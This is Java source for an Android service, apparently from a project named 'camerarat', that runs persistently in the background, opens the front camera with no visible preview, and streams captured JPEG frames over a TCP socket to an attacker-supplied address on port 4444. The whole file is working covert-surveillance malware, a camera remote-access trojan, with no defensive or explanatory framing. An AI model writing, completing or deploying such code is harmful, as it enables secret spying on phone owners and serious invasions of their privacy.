package com.camerarat;

import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.view.Surface;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Collections;

public class CameraService extends Service {
    private Socket socket;
    private OutputStream outputStream;
    private String serverIP = "SENIN_IP_ADRESIN";
    private int serverPort = 4444;
    private HandlerThread cameraThread;
    private Handler cameraHandler;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        
        new Thread(() -> connectToServer()).start();
        
        return START_STICKY;
    }

    private void connectToServer() {
        try {
            socket = new Socket(serverIP, serverPort);
            outputStream = socket.getOutputStream();
            startCameraCapture();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startCameraCapture() {
        try {
            CameraManager cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = cameraManager.getCameraIdList()[1]; // Ön kamera
            // [0] = arka, [1] = ön
            
            ImageReader imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 10);
            
            imageReader.setOnImageAvailableListener(reader -> {
                try {
                    android.media.Image image = reader.acquireLatestImage();
                    if (image != null) {
                        java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        
                        if (outputStream != null) {
                            outputStream.write(bytes);
                            outputStream.flush();
                        }
                        image.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, cameraHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        SurfaceTexture surfaceTexture = new SurfaceTexture(0);
                        Surface surface = new Surface(surfaceTexture);
                        
                        camera.createCaptureSession(
                            Collections.singletonList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        CaptureRequest.Builder builder = 
                                            camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                        builder.addTarget(imageReader.getSurface());
                                        session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {}
                            }, cameraHandler);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                @Override
                public void onDisconnected(CameraDevice camera) {}
                @Override
                public void onError(CameraDevice camera, int error) {}
            }, cameraHandler);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
